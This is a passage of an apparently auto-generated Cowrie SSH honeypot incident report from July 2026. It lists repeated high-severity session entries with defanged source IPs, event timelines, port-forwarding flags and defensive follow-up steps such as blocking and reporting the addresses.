| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:31:52` | `cowrie.session.connect` |
| `2026-07-29 17:31:52` | `cowrie.client.version` |
| `2026-07-29 17:31:52` | `cowrie.client.kex` |
| `2026-07-29 17:31:56` | `cowrie.login.success` |
| `2026-07-29 17:31:59` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:32:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:32:00` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:36:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.2[.]68` to AbuseIPDB if not already reported
- [ ] Block `27.79.2[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a18b8628662

| Field | Detail |
|---|---|
| **Source IP** | `58.22.255[.]28` |
| **First Seen** | 2026-07-29 17:33 |
| **Last Seen** | 2026-07-29 17:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:33:09` | `cowrie.session.connect` |
| `2026-07-29 17:33:10` | `cowrie.client.version` |
| `2026-07-29 17:33:10` | `cowrie.client.kex` |
| `2026-07-29 17:33:12` | `cowrie.login.success` |
| `2026-07-29 17:33:13` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:33:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.22.255[.]28` to AbuseIPDB if not already reported
- [ ] Block `58.22.255[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d40e9638c28

| Field | Detail |
|---|---|
| **Source IP** | `111.171.125[.]94` |
| **First Seen** | 2026-07-29 17:33 |
| **Last Seen** | 2026-07-29 17:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:33:23` | `cowrie.session.connect` |
| `2026-07-29 17:33:24` | `cowrie.client.version` |
| `2026-07-29 17:33:24` | `cowrie.client.kex` |
| `2026-07-29 17:33:26` | `cowrie.login.success` |
| `2026-07-29 17:33:27` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:33:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.125[.]94` to AbuseIPDB if not already reported
- [ ] Block `111.171.125[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e735b31900fe

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 17:33 |
| **Last Seen** | 2026-07-29 17:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:33:39` | `cowrie.session.connect` |
| `2026-07-29 17:33:39` | `cowrie.client.version` |
| `2026-07-29 17:33:39` | `cowrie.client.kex` |
| `2026-07-29 17:33:39` | `cowrie.login.success` |
| `2026-07-29 17:33:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4c4e97acc91

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 17:33 |
| **Last Seen** | 2026-07-29 17:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:33:39` | `cowrie.session.connect` |
| `2026-07-29 17:33:39` | `cowrie.client.version` |
| `2026-07-29 17:33:39` | `cowrie.client.kex` |
| `2026-07-29 17:33:39` | `cowrie.login.success` |
| `2026-07-29 17:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83a93d7b7f92

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 17:33 |
| **Last Seen** | 2026-07-29 17:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:33:40` | `cowrie.session.connect` |
| `2026-07-29 17:33:40` | `cowrie.client.version` |
| `2026-07-29 17:33:40` | `cowrie.client.kex` |
| `2026-07-29 17:33:40` | `cowrie.login.success` |
| `2026-07-29 17:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95b04810fda2

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 17:33 |
| **Last Seen** | 2026-07-29 17:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:33:40` | `cowrie.session.connect` |
| `2026-07-29 17:33:40` | `cowrie.client.version` |
| `2026-07-29 17:33:40` | `cowrie.client.kex` |
| `2026-07-29 17:33:40` | `cowrie.login.success` |
| `2026-07-29 17:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b76cc0767e21

| Field | Detail |
|---|---|
| **Source IP** | `27.79.2[.]68` |
| **First Seen** | 2026-07-29 17:34 |
| **Last Seen** | 2026-07-29 17:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:34:00` | `cowrie.session.connect` |
| `2026-07-29 17:34:00` | `cowrie.client.version` |
| `2026-07-29 17:34:01` | `cowrie.client.kex` |
| `2026-07-29 17:34:02` | `cowrie.login.success` |
| `2026-07-29 17:34:02` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:34:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:34:02` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:34:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.2[.]68` to AbuseIPDB if not already reported
- [ ] Block `27.79.2[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32d43f67cac6

| Field | Detail |
|---|---|
| **Source IP** | `222.187.115[.]202` |
| **First Seen** | 2026-07-29 17:35 |
| **Last Seen** | 2026-07-29 17:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:35:18` | `cowrie.session.connect` |
| `2026-07-29 17:35:18` | `cowrie.client.version` |
| `2026-07-29 17:35:19` | `cowrie.client.kex` |
| `2026-07-29 17:35:20` | `cowrie.login.success` |
| `2026-07-29 17:35:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.187.115[.]202` to AbuseIPDB if not already reported
- [ ] Block `222.187.115[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad7a9830fb12

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-29 17:35 |
| **Last Seen** | 2026-07-29 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:35:21` | `cowrie.session.connect` |
| `2026-07-29 17:35:21` | `cowrie.client.version` |
| `2026-07-29 17:35:21` | `cowrie.client.kex` |
| `2026-07-29 17:35:21` | `cowrie.login.success` |
| `2026-07-29 17:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-874d1ed5fa7d

| Field | Detail |
|---|---|
| **Source IP** | `202.111.183[.]30` |
| **First Seen** | 2026-07-29 17:36 |
| **Last Seen** | 2026-07-29 17:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:36:58` | `cowrie.session.connect` |
| `2026-07-29 17:36:59` | `cowrie.client.version` |
| `2026-07-29 17:36:59` | `cowrie.client.kex` |
| `2026-07-29 17:37:01` | `cowrie.login.success` |
| `2026-07-29 17:37:02` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:37:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.111.183[.]30` to AbuseIPDB if not already reported
- [ ] Block `202.111.183[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dca3003669c8

| Field | Detail |
|---|---|
| **Source IP** | `95.35.29[.]192` |
| **First Seen** | 2026-07-29 17:37 |
| **Last Seen** | 2026-07-29 17:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:37:12` | `cowrie.session.connect` |
| `2026-07-29 17:37:12` | `cowrie.client.version` |
| `2026-07-29 17:37:12` | `cowrie.client.kex` |
| `2026-07-29 17:37:14` | `cowrie.login.success` |
| `2026-07-29 17:37:14` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:37:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.35.29[.]192` to AbuseIPDB if not already reported
- [ ] Block `95.35.29[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f6508196e0a

| Field | Detail |
|---|---|
| **Source IP** | `27.79.2[.]68` |
| **First Seen** | 2026-07-29 17:37 |
| **Last Seen** | 2026-07-29 17:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:37:52` | `cowrie.session.connect` |
| `2026-07-29 17:37:52` | `cowrie.client.version` |
| `2026-07-29 17:37:52` | `cowrie.client.kex` |
| `2026-07-29 17:37:58` | `cowrie.login.success` |
| `2026-07-29 17:37:59` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:37:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:37:59` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:38:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.2[.]68` to AbuseIPDB if not already reported
- [ ] Block `27.79.2[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d38ba106583f

| Field | Detail |
|---|---|
| **Source IP** | `47.77.182[.]54` |
| **First Seen** | 2026-07-29 17:38 |
| **Last Seen** | 2026-07-29 17:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:38:13` | `cowrie.session.connect` |
| `2026-07-29 17:38:13` | `cowrie.client.version` |
| `2026-07-29 17:38:14` | `cowrie.client.kex` |
| `2026-07-29 17:38:14` | `cowrie.login.success` |
| `2026-07-29 17:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.77.182[.]54` to AbuseIPDB if not already reported
- [ ] Block `47.77.182[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dcdf630df95

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-29 17:38 |
| **Last Seen** | 2026-07-29 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:38:14` | `cowrie.session.connect` |
| `2026-07-29 17:38:14` | `cowrie.client.version` |
| `2026-07-29 17:38:14` | `cowrie.client.kex` |
| `2026-07-29 17:38:15` | `cowrie.login.success` |
| `2026-07-29 17:38:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c92b5eca8073

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]132` |
| **First Seen** | 2026-07-29 17:39 |
| **Last Seen** | 2026-07-29 17:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:39:43` | `cowrie.session.connect` |
| `2026-07-29 17:39:43` | `cowrie.client.version` |
| `2026-07-29 17:39:43` | `cowrie.client.kex` |
| `2026-07-29 17:39:45` | `cowrie.login.success` |
| `2026-07-29 17:39:46` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:39:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:39:46` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:39:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]132` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df2794a29752

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]132` |
| **First Seen** | 2026-07-29 17:42 |
| **Last Seen** | 2026-07-29 17:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:42:24` | `cowrie.session.connect` |
| `2026-07-29 17:42:24` | `cowrie.client.version` |
| `2026-07-29 17:42:24` | `cowrie.client.kex` |
| `2026-07-29 17:42:26` | `cowrie.login.success` |
| `2026-07-29 17:42:26` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:42:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:42:26` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]132` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-568d113daecb

| Field | Detail |
|---|---|
| **Source IP** | `27.79.2[.]68` |
| **First Seen** | 2026-07-29 17:43 |
| **Last Seen** | 2026-07-29 17:45 |
| **Session Duration** | 71s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:43:48` | `cowrie.session.connect` |
| `2026-07-29 17:43:48` | `cowrie.client.version` |
| `2026-07-29 17:44:35` | `cowrie.client.kex` |
| `2026-07-29 17:44:36` | `cowrie.login.success` |
| `2026-07-29 17:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.2[.]68` to AbuseIPDB if not already reported
- [ ] Block `27.79.2[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a18112abb1df

| Field | Detail |
|---|---|
| **Source IP** | `27.79.2[.]68` |
| **First Seen** | 2026-07-29 17:45 |
| **Last Seen** | 2026-07-29 17:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:45:29` | `cowrie.session.connect` |
| `2026-07-29 17:45:29` | `cowrie.client.version` |
| `2026-07-29 17:45:33` | `cowrie.client.kex` |
| `2026-07-29 17:45:34` | `cowrie.login.success` |
| `2026-07-29 17:45:34` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:45:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:45:36` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.2[.]68` to AbuseIPDB if not already reported
- [ ] Block `27.79.2[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c41c7b3a76f8

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]132` |
| **First Seen** | 2026-07-29 17:47 |
| **Last Seen** | 2026-07-29 17:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:47:25` | `cowrie.session.connect` |
| `2026-07-29 17:47:25` | `cowrie.client.version` |
| `2026-07-29 17:47:25` | `cowrie.client.kex` |
| `2026-07-29 17:47:31` | `cowrie.login.success` |
| `2026-07-29 17:47:31` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:47:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:47:31` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]132` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa3bc542c7ec

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]132` |
| **First Seen** | 2026-07-29 17:50 |
| **Last Seen** | 2026-07-29 17:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:50:06` | `cowrie.session.connect` |
| `2026-07-29 17:50:06` | `cowrie.client.version` |
| `2026-07-29 17:50:13` | `cowrie.client.kex` |
| `2026-07-29 17:50:14` | `cowrie.login.success` |
| `2026-07-29 17:50:14` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:50:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:50:15` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:50:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]132` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebdd5baa46cc

| Field | Detail |
|---|---|
| **Source IP** | `27.79.2[.]68` |
| **First Seen** | 2026-07-29 17:50 |
| **Last Seen** | 2026-07-29 17:52 |
| **Session Duration** | 109s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:50:53` | `cowrie.session.connect` |
| `2026-07-29 17:50:53` | `cowrie.client.version` |
| `2026-07-29 17:51:04` | `cowrie.client.kex` |
| `2026-07-29 17:51:27` | `cowrie.login.success` |
| `2026-07-29 17:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.2[.]68` to AbuseIPDB if not already reported
- [ ] Block `27.79.2[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5b5d79afde0

| Field | Detail |
|---|---|
| **Source IP** | `159.75.211[.]148` |
| **First Seen** | 2026-07-29 17:52 |
| **Last Seen** | 2026-07-29 17:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:52:11` | `cowrie.session.connect` |
| `2026-07-29 17:52:11` | `cowrie.client.version` |
| `2026-07-29 17:52:11` | `cowrie.client.kex` |
| `2026-07-29 17:52:12` | `cowrie.login.success` |
| `2026-07-29 17:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.75.211[.]148` to AbuseIPDB if not already reported
- [ ] Block `159.75.211[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa65e4b131e1

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-29 17:52 |
| **Last Seen** | 2026-07-29 17:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:52:13` | `cowrie.session.connect` |
| `2026-07-29 17:52:13` | `cowrie.client.version` |
| `2026-07-29 17:52:13` | `cowrie.client.kex` |
| `2026-07-29 17:52:13` | `cowrie.login.success` |
| `2026-07-29 17:52:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57c9af2bddcc

| Field | Detail |
|---|---|
| **Source IP** | `83.166.50[.]15` |
| **First Seen** | 2026-07-29 17:53 |
| **Last Seen** | 2026-07-29 17:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:53:37` | `cowrie.session.connect` |
| `2026-07-29 17:53:38` | `cowrie.client.version` |
| `2026-07-29 17:53:38` | `cowrie.client.kex` |
| `2026-07-29 17:53:39` | `cowrie.login.success` |
| `2026-07-29 17:53:39` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.166.50[.]15` to AbuseIPDB if not already reported
- [ ] Block `83.166.50[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cf0d3c7a70e

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]51` |
| **First Seen** | 2026-07-29 17:53 |
| **Last Seen** | 2026-07-29 17:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:53:44` | `cowrie.session.connect` |
| `2026-07-29 17:53:45` | `cowrie.client.version` |
| `2026-07-29 17:53:45` | `cowrie.client.kex` |
| `2026-07-29 17:53:47` | `cowrie.login.success` |
| `2026-07-29 17:53:48` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]51` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77a9f709da61

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]132` |
| **First Seen** | 2026-07-29 17:54 |
| **Last Seen** | 2026-07-29 17:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:54:15` | `cowrie.session.connect` |
| `2026-07-29 17:54:15` | `cowrie.client.version` |
| `2026-07-29 17:54:16` | `cowrie.client.kex` |
| `2026-07-29 17:54:17` | `cowrie.login.success` |
| `2026-07-29 17:54:18` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:54:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:54:18` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:54:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]132` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1e79d404a9b

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]132` |
| **First Seen** | 2026-07-29 17:55 |
| **Last Seen** | 2026-07-29 17:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:55:45` | `cowrie.session.connect` |
